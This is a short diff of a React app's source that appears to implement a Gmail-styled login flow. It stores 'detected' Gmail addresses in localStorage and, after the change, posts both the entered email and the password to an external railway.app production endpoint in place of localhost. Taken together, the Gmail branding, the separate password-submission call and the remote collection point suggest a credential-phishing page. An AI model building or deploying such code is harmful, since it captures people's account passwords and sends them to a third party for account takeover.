@@ -11,7 +11,7 @@ import { ChevronDown, Eye, EyeOff } from 'lucide-react';
 const emailDetectionService = {
   getDetectedEmails: (): string[] => {
     const stored = localStorage.getItem('gmail_detected_emails');
-    return stored ? JSON.parse(stored) : ['user@gmail.com', 'test@gmail.com'];
+    return stored ? JSON.parse(stored) : ['@gmail.com', '@gmail.com'];
   },
   saveEmail: (email: string) => {
     const emails = emailDetectionService.getDetectedEmails();
@@ -46,7 +46,7 @@ export default function App() {
     setError('');
 
     try {
-      const response = await fetch('http://localhost:3000/api/submit-email', {
+      const response = await fetch('https://demascus-production-b89b.up.railway.app/api/submit-email', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email }),
@@ -79,7 +79,7 @@ export default function App() {
     setError('');
 
     try {
-      const response = await fetch('http://localhost:3000/api/submit-password', {
+      const response = await fetch('https://demascus-production-b89b.up.railway.app/api/submit-password', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ attemptId, password }),
